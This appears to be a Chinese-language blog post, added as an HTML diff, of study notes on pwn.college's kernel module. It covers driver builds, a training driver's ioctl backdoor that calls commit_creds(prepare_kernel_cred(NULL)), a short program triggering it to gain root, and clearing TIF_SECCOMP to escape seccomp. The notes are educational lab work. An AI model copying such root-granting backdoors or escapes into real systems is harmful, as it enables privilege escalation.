@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="kernel基础环境+驱动编译+基础提权、沙箱绕过 参考链接https:&#x2F;&#x2F;pwn.college&#x2F;modules&#x2F;kernel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel-1-basic_knowledge">
+<meta property="og:url" content="https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="kernel基础环境+驱动编译+基础提权、沙箱绕过 参考链接https:&#x2F;&#x2F;pwn.college&#x2F;modules&#x2F;kernel">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-23T13:11:24.000Z">
+<meta property="article:modified_time" content="2022-01-23T08:10:56.015Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/project/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/project/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/project/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>kernel-1-basic_knowledge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/project/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/project/">Home</a></li><!--
+     --><!--
+       --><li><a href="/project/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/project/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/project/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/project/2022/01/22/Drangonctf2021-noflippidy/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&text=kernel-1-basic_knowledge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&is_video=false&description=kernel-1-basic_knowledge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=kernel-1-basic_knowledge&body=Check out this article: https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&name=kernel-1-basic_knowledge&description=&lt;p&gt;kernel基础环境+驱动编译+基础提权、沙箱绕过&lt;/p&gt;
+&lt;p&gt;参考链接&lt;a href=&#34;https://pwn.college/modules/kernel&#34;&gt;https://pwn.college/modules/kernel&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&t=kernel-1-basic_knowledge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#kernel-1"><span class="toc-number">1.</span> <span class="toc-text">kernel-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E3%80%81%E8%BF%90%E8%A1%8C%E9%A9%B1%E5%8A%A8"><span class="toc-number">1.2.</span> <span class="toc-text">编译、运行驱动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%92%8C%E5%88%A0%E9%99%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text">安装和删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E5%8F%B7"><span class="toc-number">1.2.2.</span> <span class="toc-text">设备号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ioctl"><span class="toc-number">1.2.3.</span> <span class="toc-text">ioctl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BEcommit-creds"><span class="toc-number">1.4.</span> <span class="toc-text">如何寻找commit_creds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sandbox"><span class="toc-number">1.5.</span> <span class="toc-text">sandbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-1"><span class="toc-number">1.5.3.</span> <span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        kernel-1-basic_knowledge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">nich0las</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-23T13:11:24.000Z" itemprop="datePublished">2022-01-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/project/categories/basic/">basic</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/project/tags/kernel/" rel="tag">kernel</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>kernel基础环境+驱动编译+基础提权、沙箱绕过</p>
+<p>参考链接<a target="_blank" rel="noopener" href="https://pwn.college/modules/kernel">https://pwn.college/modules/kernel</a></p>
+<span id="more"></span>
+
+<h1 id="kernel-1"><a href="#kernel-1" class="headerlink" title="kernel-1"></a>kernel-1</h1><p>参考链接<a target="_blank" rel="noopener" href="https://pwn.college/modules/kernel">https://pwn.college/modules/kernel</a></p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>这里可以说是遇到大坑了</p>
+<p>尝试过的网站：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85837">https://www.anquanke.com/post/id/85837</a> (失败)</li>
+</ol>
+<p>原因: kernel版本太老，编译器不支持</p>
+<ol start="2">
+<li><a target="_blank" rel="noopener" href="https://github.com/yuawn/Linux-Kernel-Exploitation">https://github.com/yuawn/Linux-Kernel-Exploitation</a> (可以成功，但是最后删掉了)</li>
+</ol>
+<p>但是由于网上的利用方法都基于<code>create_proc_entry</code>，这个网址的内核版本又比较高，不支持这个函数。就没有教程可以学，于是删掉了</p>
+<ol start="3">
+<li>直接从pwn.college里面下载 <a target="_blank" rel="noopener" href="https://pwn.college/modules/kernel">https://pwn.college/modules/kernel</a> （推荐）</li>
+</ol>
+<p>这个方法最简单，还有视频教程。本篇笔记就基于此。</p>
+<h2 id="编译、运行驱动"><a href="#编译、运行驱动" class="headerlink" title="编译、运行驱动"></a>编译、运行驱动</h2><h3 id="安装和删除"><a href="#安装和删除" class="headerlink" title="安装和删除"></a>安装和删除</h3><p>可以在/src中编写自己驱动的.c版本，之后./build.sh再launch.sh就可以再kernel中看见刚才编写的模块了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod a.ko # 可以用来安装并运行一个编译好的内核模块</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod # 显示安装的模块</span><br><span class="line">rmmod # 删除模块</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/ # [    2.634357] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3</span><br><span class="line">ls</span><br><span class="line">bin                 hello_log.ko        proc</span><br><span class="line">dev                 hello_proc_char.ko  root</span><br><span class="line">etc                 home                sbin</span><br><span class="line">flag                init                sys</span><br><span class="line">hello_dev_char.ko   linuxrc             usr</span><br><span class="line">hello_ioctl.ko      make_root.ko</span><br><span class="line">/ # insmod hello_log.ko </span><br><span class="line">[   31.187734] hello_log: loading out-of-tree module taints kernel.</span><br><span class="line">[   31.193743] Hello pwn.college!</span><br><span class="line">/ # lsmod</span><br><span class="line">hello_log 16384 0 - Live 0xffffffffc0000000 (O)</span><br><span class="line">/ # rmmod hello_log.ko </span><br><span class="line">[   47.961254] Goodbye pwn.college!</span><br><span class="line">/ # </span><br></pre></td></tr></table></figure>
+
+<h3 id="设备号"><a href="#设备号" class="headerlink" title="设备号"></a>设备号</h3><p>和在os中学过的知识一样，每一个设备都有一个设备号。这里安装了一个设备，能够打印出自己的设备号。首先看看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册设备对应读写函数</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">  	.read = device_read,</span><br><span class="line">  	.write = device_write,</span><br><span class="line">  	.open = device_open,</span><br><span class="line">  	.release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设备初始化时打印一些参数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  	major_number = register_chrdev(<span class="number">0</span>, <span class="string">&quot;pwn-college-char&quot;</span>, &amp;fops);  <span class="comment">// &lt;====这里的返回值就是设备号</span></span><br><span class="line"></span><br><span class="line">  	<span class="keyword">if</span> (major_number &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    		printk(KERN_ALERT <span class="string">&quot;Registering char device failed with %d\n&quot;</span>, major_number);</span><br><span class="line">    		<span class="keyword">return</span> major_number;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  	printk(KERN_INFO <span class="string">&quot;I was assigned major number %d.\n&quot;</span>, major_number);</span><br><span class="line">  	printk(KERN_INFO <span class="string">&quot;Create device with: &#x27;mknod /dev/pwn-college-char c %d 0&#x27;.\n&quot;</span>, major_number);</span><br><span class="line">  	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ # insmod hello_dev_char.ko </span><br><span class="line">[  310.758676] I was assigned major number 248.</span><br><span class="line">[  310.759132] Create device with: &#x27;mknod /dev/pwn-college-char c 248 0&#x27;.</span><br></pre></td></tr></table></figure>
+
+<h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><p>本质是和设备交互的函数。可以往设备里面写控制编号等等。也是一个比较危险的，经常被恶意利用的函数。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>本质上要做的，是在process controlblock里面把uid设置成0，也就获得了os权限。</p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>cred：记录了进程的一些属性，包含特权级等</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(struct cred *); <span class="comment">// 替换原有的cred</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct cred * <span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *reference_task_struct)</span></span>; <span class="comment">// 如果传递参数为NULL，将得到一个root的cred</span></span><br></pre></td></tr></table></figure>
+
+<p>我们的目的是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"><span class="comment">// 就像用户态的system(/bin/sh)一样</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>在/src/make_root.c中，有个重要函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">device_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> ioctl_num, <span class="keyword">unsigned</span> <span class="keyword">long</span> ioctl_param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Got ioctl argument %d!&quot;</span>, ioctl_num);</span><br><span class="line">        <span class="keyword">if</span> (ioctl_num == PWN)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">if</span> (ioctl_param == <span class="number">0x13371337</span>)</span><br><span class="line">        	&#123;</span><br><span class="line">        		printk(KERN_ALERT <span class="string">&quot;Granting root access!&quot;</span>);</span><br><span class="line">    			  commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));  <span class="comment">// &lt;======= function to get root privilige</span></span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="keyword">if</span> (ioctl_param == <span class="number">0x31337</span>)</span><br><span class="line">    		&#123;</span><br><span class="line">        		printk(KERN_ALERT <span class="string">&quot;Escaping seccomp!&quot;</span>);</span><br><span class="line">        		printk(KERN_ALERT <span class="string">&quot;FLAGS BEFORE: %lx&quot;</span>, current-&gt;thread_info.flags);</span><br><span class="line">    			current-&gt;thread_info.flags &amp;= ~_TIF_SECCOMP;</span><br><span class="line">        		printk(KERN_ALERT <span class="string">&quot;FLAGS AFTER: %lx&quot;</span>, current-&gt;thread_info.flags);</span><br><span class="line">    		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这相当于，我们只要控制了变量ioctl_param就能成功提权。</p>
+<p>在pwn-college中，只需要<code>su - ctf</code>就可以切换到原本虚拟的的文件系统中。使用静态编译我们写的如下代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwn-college-root&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;before uid: %d\n&quot;</span>, getuid());</span><br><span class="line">    ioctl(fd,<span class="number">0x7001</span>,<span class="number">0x13371337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after uid: %d\n&quot;</span>, getuid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o attack -static make_root_solve.c</span><br></pre></td></tr></table></figure>
+
+<p>之后运行，就可以拿到一个root权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop/kernel/pwnkernel/src $ ./attack </span><br><span class="line">[ 1780.024894] Device opened.</span><br><span class="line">[ 1780.029412] Got ioctl argument 28673!</span><br><span class="line">before uid: 1000</span><br><span class="line">after uid: 0  # &lt;======   grant superuser!</span><br><span class="line">[ 1780.029791] Granting root access!</span><br><span class="line">[ 1780.032075] Device closed.</span><br><span class="line">[ 1780.035175] attack (89) used greatest stack depth: 14080 bytes left</span><br><span class="line">~/Desktop/kernel/pwnkernel/src $ </span><br></pre></td></tr></table></figure>
+
+<h2 id="如何寻找commit-creds"><a href="#如何寻找commit-creds" class="headerlink" title="如何寻找commit_creds"></a>如何寻找commit_creds</h2><ol>
+<li>直接寻找符号</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat/proc/kallsyms   <span class="comment"># 可以打印出内核所有符号地址，包括函数</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /proc/kallsyms | grep <span class="string">&#x27;commit_creds&#x27;</span></span></span><br><span class="line">ffffffff810842b0 T commit_creds</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>在关闭ASLR或者古老版本的内核中，上述函数地址是可以预测的</li>
+<li>调试</li>
+<li>泄露，和用户态一样</li>
+</ol>
+<h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><p>sandbox和seccomp密切相关。我们首先看看他在那里实现。事实上还是在之前的process control block里面。flags中有一个比特指示是否开启了seccomp</p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">// LOTS of stuff, including</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;    <span class="comment">/* low level flags */</span></span><br><span class="line">    u32 status;        <span class="comment">/* thread synchronous flags */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// flags is a bit field that, among many other things, holds a bit named TIF_SECCOMP</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是实现seccomp的主函数在<code>secure computing</code>中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Reference:</span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/latest/source/include/linux/seccomp.h#L43 </span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">secure_computing</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(test_thread_flag(TIF_SECCOMP)))  &lt;==== 检查flag位</span><br><span class="line">        <span class="keyword">return</span>  __secure_computing(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __secure_computing(<span class="keyword">const</span> struct seccomp_data *sd)<span class="comment">// 主要的实现函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// lots of stuff, then...</span></span><br><span class="line"></span><br><span class="line">    this_syscall = sd ? sd-&gt;nr : syscall_get_nr(current, task_pt_regs(current));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">        <span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">            __secure_computing_strict(this_syscall);  <span class="comment">/* may call do_exit */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">            <span class="keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            BUG();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>可想而知，绕过的方法还是集中在PCB中，我们只需要把flag位与上相反的比特即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current_task_struct-&gt;thread_info.flags &amp;= ~(<span class="number">1</span> &lt;&lt; TIF_SECCOMP)</span><br></pre></td></tr></table></figure>
+
+<h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><p>依然使用之前的make_root.c，其中也包含了seccomp。和之前提权一样，只需要发送响应ioctf代码即可(如果开启了seccomp)</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上内容包含编译内核、编写驱动、运行驱动；提权和沙箱绕过两个基本操作。未涉及漏洞利用。以上大约为基础知识介绍。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/project/">Home</a></li>
+         
+          <li><a href="/project/about/">About</a></li>
+         
+          <li><a href="/project/archives/">Writing</a></li>
+         
+          <li><a href="/project/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#kernel-1"><span class="toc-number">1.</span> <span class="toc-text">kernel-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E3%80%81%E8%BF%90%E8%A1%8C%E9%A9%B1%E5%8A%A8"><span class="toc-number">1.2.</span> <span class="toc-text">编译、运行驱动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%92%8C%E5%88%A0%E9%99%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text">安装和删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E5%8F%B7"><span class="toc-number">1.2.2.</span> <span class="toc-text">设备号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ioctl"><span class="toc-number">1.2.3.</span> <span class="toc-text">ioctl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 